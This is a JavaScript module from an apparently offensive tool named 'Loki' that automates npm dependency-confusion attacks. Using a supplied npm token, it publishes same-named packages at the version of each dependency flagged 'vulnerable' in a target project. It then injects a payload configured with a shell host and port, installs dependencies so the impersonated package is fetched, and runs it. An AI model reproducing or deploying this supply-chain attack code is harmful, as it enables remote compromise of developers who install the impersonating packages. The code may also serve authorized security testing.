'use strict';

import fs from 'fs';
import chalk from 'chalk';
import Nm from './npm-api.js'; // Nm as NPM-API manager

let manager;

function log(message) {
	if (!message) return;
	console.log(chalk.rgb(247, 30, 56)('[Loki]'), message);
}

function success(message) {
	if (!message) return;
	log(chalk.rgb(0, 255, 0)(message));
}

function error(message) {
	if (!message) return;
	log(chalk.rgb(255, 0, 0)(message));
}

function warning(message) {
	if (!message) return;
	log(chalk.rgb(255, 255, 0)(message));
}

function getVersion(pkg) {
	const matches = pkg.match(/(\d+\.\d+\.\d+)/);
	return matches ? matches[1] : '1.0.0'; // default to 1.0.0
}

async function getProfile() {
	try {
		return await manager.getProfile();
	} catch (err) {
		console.log(err);
	}
}

function createPackage(pkg, version) {
	return manager.createPackage(pkg, version); // return the promise
}

async function handleSubmission(submission, shell_data, entrypoint) {
	const { manifest, job } = submission;
	const response = await job;

	if (response.status === 200) {
		success(`Package created successfully, available at \"${response.url}\"`);

		if (shell_data.attack) {
			log(`Performing attack using ${manifest.name}@${manifest.version}`);
			const result = manager.pm.insertPayload(entrypoint);
			if (result) {
				success(`Payload injected successfully with the following details: host=${shell_data.host} & port=${shell_data.port}`);
				log('Installing dependencies to download impersonated package.');
				manager.pm.installDependencies();

				success('Dependencies installed successfully');
				log('Finally, running the code ...');
				manager.pm.testInjection(entrypoint, success);
			} else {
				error('Failed to inject payload');
			}
		}
	} else {
		error(`Package creation failed, status code: ${response.status}`);
	}
}

async function setup({ pkgs, directory, entrypoint, accesstoken, shell_data }) {
	manager = new Nm(accesstoken);
	const { dependencies } = JSON.parse(fs.readFileSync(`${directory}/package.json`, 'utf8'));
	const is_valid_token = await manager.verifyToken();

	// verify that the token is valid and is available to retrieve data from npmjs
	if (is_valid_token.error || !is_valid_token.success) {
		error('Token provided is not valid. Make sure it is not readonly.');
		process.exit(-1);
	}
	await getProfile();

	// loop through the results
	const { results, commits } = pkgs;
	for (const pkg in results) {
		if (Object.prototype.hasOwnProperty.call(results, pkg)) {
			const state = results[pkg];

			if (Object.prototype.hasOwnProperty.call(commits, pkg)) {
				success(`${state} package has been introduced in the commit with the following hash: ${commits[pkg]}`);
			}

			if (state === 'vulnerable') {
				const target_version = getVersion(dependencies[pkg]);

				success(`${pkg}@${target_version} is vulnerable.`);
				log(`Creating package ${pkg}@${target_version}.`);

				await handleSubmission(await createPackage({
					pkg,
					directory,
					version: target_version,
					shell_data
				}), shell_data, entrypoint);
			} else if (state === 'suspicious') {
				warning(`${pkg} is suspicious. Proceed with manual investigation.`);
			}
		}
	}
}

export { setup };
